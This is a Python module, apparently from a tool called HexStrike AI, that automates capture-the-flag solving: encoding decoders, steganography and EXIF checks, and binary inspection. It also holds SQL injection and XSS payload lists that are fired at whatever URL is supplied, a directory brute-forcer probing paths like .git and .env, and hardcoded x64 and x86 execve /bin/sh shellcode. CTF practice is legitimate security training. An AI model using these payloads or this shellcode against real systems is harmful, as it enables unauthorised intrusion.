#!/usr/bin/env python3
"""
HexStrike AI - CTF增强模块
CTF Enhanced Module

专为CTF比赛设计的高级自动化解题工具
"""

import base64
import hashlib
import re
import os
import subprocess
import requests
from typing import Dict, Any, List, Optional
from collections import defaultdict


class CTFCryptoSolver:
    """CTF密码学增强解题器"""
    
    def __init__(self):
        self.solved_flags = []
        
    def solve_all_encodings(self, data: str) -> Dict[str, Any]:
        """尝试所有常见编码"""
        results = {
            'original': data,
            'attempts': []
        }
        
        # Base64多层解码
        base64_result = self._multi_base64_decode(data)
        if base64_result:
            results['attempts'].append(base64_result)
        
        # Hex解码
        hex_result = self._try_hex_decode(data)
        if hex_result:
            results['attempts'].append(hex_result)
        
        # ROT13/Caesar
        caesar_result = self._try_all_caesar(data)
        if caesar_result:
            results['attempts'].extend(caesar_result)
        
        # URL解码
        url_result = self._try_url_decode(data)
        if url_result:
            results['attempts'].append(url_result)
        
        # ASCII码
        ascii_result = self._try_ascii_decode(data)
        if ascii_result:
            results['attempts'].append(ascii_result)
        
        return results
    
    def _multi_base64_decode(self, data: str, max_depth: int = 10) -> Optional[Dict]:
        """多层Base64解码"""
        current = data
        layers = 0
        
        for i in range(max_depth):
            try:
                decoded = base64.b64decode(current).decode('utf-8', errors='ignore')
                if self._is_flag(decoded):
                    return {
                        'type': 'base64',
                        'layers': layers + 1,
                        'result': decoded,
                        'flag_found': True
                    }
                if decoded == current:  # 没有变化
                    break
                current = decoded
                layers += 1
            except:
                break
        
        if layers > 0:
            return {
                'type': 'base64',
                'layers': layers,
                'result': current,
                'flag_found': self._is_flag(current)
            }
        return None
    
    def _try_hex_decode(self, data: str) -> Optional[Dict]:
        """尝试Hex解码"""
        try:
            # 移除空格和常见分隔符
            hex_data = data.replace(' ', '').replace('0x', '').replace('\\x', '')
            decoded = bytes.fromhex(hex_data).decode('utf-8', errors='ignore')
            if decoded and len(decoded) > 0:
                return {
                    'type': 'hex',
                    'result': decoded,
                    'flag_found': self._is_flag(decoded)
                }
        except:
            pass
        return None
    
    def _try_all_caesar(self, data: str) -> List[Dict]:
        """尝试所有Caesar偏移"""
        results = []
        for shift in range(1, 26):
            decoded = self._caesar_shift(data, shift)
            if self._is_flag(decoded):
                results.append({
                    'type': 'caesar',
                    'shift': shift,
                    'result': decoded,
                    'flag_found': True
                })
        return results
    
    def _caesar_shift(self, text: str, shift: int) -> str:
        """Caesar密码偏移"""
        result = []
        for char in text:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                result.append(chr((ord(char) - base - shift) % 26 + base))
            else:
                result.append(char)
        return ''.join(result)
    
    def _try_url_decode(self, data: str) -> Optional[Dict]:
        """URL解码"""
        try:
            from urllib.parse import unquote
            decoded = unquote(data)
            if decoded != data:
                return {
                    'type': 'url',
                    'result': decoded,
                    'flag_found': self._is_flag(decoded)
                }
        except:
            pass
        return None
    
    def _try_ascii_decode(self, data: str) -> Optional[Dict]:
        """ASCII码解码"""
        try:
            # 尝试空格分隔的ASCII码
            nums = data.split()
            decoded = ''.join(chr(int(n)) for n in nums if n.isdigit())
            if decoded:
                return {
                    'type': 'ascii',
                    'result': decoded,
                    'flag_found': self._is_flag(decoded)
                }
        except:
            pass
        return None
    
    def _is_flag(self, text: str) -> bool:
        """检查是否包含flag"""
        patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'\{[a-zA-Z0-9_]+\}'
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)


class CTFWebExploiter:
    """CTF Web漏洞利用增强"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
    
    def auto_sql_injection(self, url: str, param: str) -> Dict[str, Any]:
        """自动SQL注入测试"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1' --",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND SLEEP(5)--",
            "1' OR '1'='1' ORDER BY 1--",
        ]
        
        results = {
            'vulnerable': False,
            'successful_payloads': [],
            'database_info': {}
        }
        
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                # 检测SQL错误
                sql_errors = [
                    'SQL syntax', 'mysql_fetch', 'Warning: mysql',
                    'PostgreSQL', 'SQLite', 'ORA-', 'Microsoft SQL'
                ]
                
                for error in sql_errors:
                    if error in response.text:
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'error': error,
                            'evidence': response.text[:200]
                        })
                        break
            except:
                pass
        
        return results
    
    def auto_xss_test(self, url: str, param: str) -> Dict[str, Any]:
        """自动XSS测试"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
        ]
        
        results = {
            'vulnerable': False,
            'reflected_payloads': []
        }
        
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    results['vulnerable'] = True
                    results['reflected_payloads'].append(payload)
            except:
                pass
        
        return results
    
    def directory_bruteforce(self, base_url: str, wordlist: List[str] = None) -> List[str]:
        """目录爆破"""
        if wordlist is None:
            wordlist = [
                'admin', 'login', 'flag', 'secret', 'backup',
                'config', 'db', 'database', 'api', 'upload',
                '.git', '.svn', '.env', 'robots.txt', 'sitemap.xml'
            ]
        
        found_paths = []
        
        for path in wordlist:
            test_url = f"{base_url}/{path}"
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    found_paths.append({
                        'path': path,
                        'status': response.status_code,
                        'size': len(response.content)
                    })
            except:
                pass
        
        return found_paths


class CTFReverseHelper:
    """CTF逆向工程辅助"""
    
    def strings_extract(self, file_path: str) -> Dict[str, Any]:
        """提取字符串（增强版）"""
        results = {
            'printable_strings': [],
            'potential_flags': [],
            'interesting_strings': []
        }
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # 提取可打印字符串（长度>=4）
            strings = re.findall(b'[\x20-\x7e]{4,}', content)
            
            for s in strings:
                s_decoded = s.decode('utf-8', errors='ignore')
                results['printable_strings'].append(s_decoded)
                
                # 检查flag模式
                if re.search(r'flag|ctf|key|password', s_decoded, re.IGNORECASE):
                    results['potential_flags'].append(s_decoded)
                
                # 检查有趣的字符串
                if any(keyword in s_decoded.lower() for keyword in ['http', 'ftp', 'ssh', 'base64']):
                    results['interesting_strings'].append(s_decoded)
            
            return results
        except Exception as e:
            return {'error': str(e)}
    
    def check_file_type(self, file_path: str) -> Dict[str, str]:
        """检查文件类型"""
        try:
            result = subprocess.run(['file', file_path], capture_output=True, text=True)
            return {'file_type': result.stdout.strip()}
        except:
            return {'file_type': 'Unknown'}
    
    def checksec_analysis(self, binary_path: str) -> Dict[str, Any]:
        """安全特性检查"""
        try:
            result = subprocess.run(['checksec', '--file', binary_path], 
                                  capture_output=True, text=True)
            return {'checksec': result.stdout}
        except:
            return {'checksec': 'checksec not available'}


class CTFPwnHelper:
    """CTF Pwn题辅助"""
    
    def generate_cyclic_pattern(self, length: int = 200) -> str:
        """生成循环模式（用于找偏移）"""
        try:
            from pwn import cyclic
            return cyclic(length).decode()
        except ImportError:
            # 简化版循环模式
            pattern = ''
            for i in range(length // 4):
                pattern += chr(65 + (i % 26)) * 4
            return pattern[:length]
    
    def find_offset(self, pattern: str, target: str) -> int:
        """查找偏移量"""
        try:
            return pattern.find(target)
        except:
            return -1
    
    def generate_shellcode(self, arch: str = 'x64') -> Dict[str, str]:
        """生成常用shellcode"""
        shellcodes = {
            'x64': {
                'execve_sh': r'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05',
                'read_flag': r'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x58\x0f\x05'
            },
            'x86': {
                'execve_sh': r'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
            }
        }
        return shellcodes.get(arch, {})


class CTFMiscSolver:
    """CTF Misc题解题器"""
    
    def solve_qr_code(self, image_path: str) -> Optional[str]:
        """解析二维码"""
        try:
            from PIL import Image
            import pyzbar.pyzbar as pyzbar
            
            img = Image.open(image_path)
            decoded = pyzbar.decode(img)
            if decoded:
                return decoded[0].data.decode()
        except:
            pass
        return None
    
    def extract_exif(self, image_path: str) -> Dict[str, Any]:
        """提取EXIF信息"""
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS
            
            img = Image.open(image_path)
            exif = img._getexif()
            
            if exif:
                return {TAGS.get(k, k): v for k, v in exif.items()}
        except:
            pass
        return {}
    
    def check_steganography(self, image_path: str) -> Dict[str, Any]:
        """检查隐写术"""
        results = {
            'lsb_possible': False,
            'file_appended': False,
            'metadata': {}
        }
        
        try:
            with open(image_path, 'rb') as f:
                data = f.read()
            
            # 检查文件末尾是否有附加数据
            if b'PK\x03\x04' in data[1000:]:  # ZIP signature
                results['file_appended'] = True
                results['appended_type'] = 'ZIP'
            
            # 检查LSB可能性（简化检测）
            results['lsb_possible'] = len(data) > 10000
            
        except Exception as e:
            results['error'] = str(e)
        
        return results


# 统一接口
class CTFMaster:
    """CTF大师 - 统一所有CTF解题功能"""
    
    def __init__(self):
        self.crypto = CTFCryptoSolver()
        self.web = CTFWebExploiter()
        self.reverse = CTFReverseHelper()
        self.pwn = CTFPwnHelper()
        self.misc = CTFMiscSolver()
    
    def auto_solve(self, challenge_type: str, data: Dict[str, Any]) -> Dict[str, Any]:
        """自动解题调度"""
        solvers = {
            'crypto': self._solve_crypto,
            'web': self._solve_web,
            'reverse': self._solve_reverse,
            'pwn': self._solve_pwn,
            'misc': self._solve_misc
        }
        
        solver = solvers.get(challenge_type.lower())
        if solver:
            return solver(data)
        else:
            return {'error': f'Unknown challenge type: {challenge_type}'}
    
    def _solve_crypto(self, data: Dict) -> Dict:
        """解密码学题"""
        encoded_data = data.get('data', '')
        return self.crypto.solve_all_encodings(encoded_data)
    
    def _solve_web(self, data: Dict) -> Dict:
        """解Web题"""
        url = data.get('url', '')
        param = data.get('param', 'id')
        
        results = {}
        results['sql_injection'] = self.web.auto_sql_injection(url, param)
        results['xss'] = self.web.auto_xss_test(url, param)
        
        return results
    
    def _solve_reverse(self, data: Dict) -> Dict:
        """解逆向题"""
        file_path = data.get('file', '')
        if not file_path:
            return {'error': 'file path required'}
        
        results = {}
        results['strings'] = self.reverse.strings_extract(file_path)
        results['file_type'] = self.reverse.check_file_type(file_path)
        results['security'] = self.reverse.checksec_analysis(file_path)
        
        return results
    
    def _solve_pwn(self, data: Dict) -> Dict:
        """解Pwn题"""
        arch = data.get('arch', 'x64')
        return {
            'pattern': self.pwn.generate_cyclic_pattern(200),
            'shellcode': self.pwn.generate_shellcode(arch)
        }
    
    def _solve_misc(self, data: Dict) -> Dict:
        """解Misc题"""
        file_path = data.get('file', '')
        if not file_path:
            return {'error': 'file path required'}
        
        results = {}
        
        # 根据文件类型选择方法
        if file_path.lower().endswith(('.jpg', '.png', '.bmp')):
            results['qr_code'] = self.misc.solve_qr_code(file_path)
            results['exif'] = self.misc.extract_exif(file_path)
            results['stego'] = self.misc.check_steganography(file_path)
        
        return results


if __name__ == "__main__":
    print("🏁 CTF Enhanced Module - Testing")
    print("=" * 60)
    
    master = CTFMaster()
    
    # 测试密码学
    print("\n🔐 Testing Crypto Solver...")
    crypto_result = master.auto_solve('crypto', {
        'data': 'ZmxhZ3t0ZXN0X2ZsYWd9'
    })
    print(f"Result: {crypto_result}")
    
    print("\n✅ CTF Enhanced Module ready!")
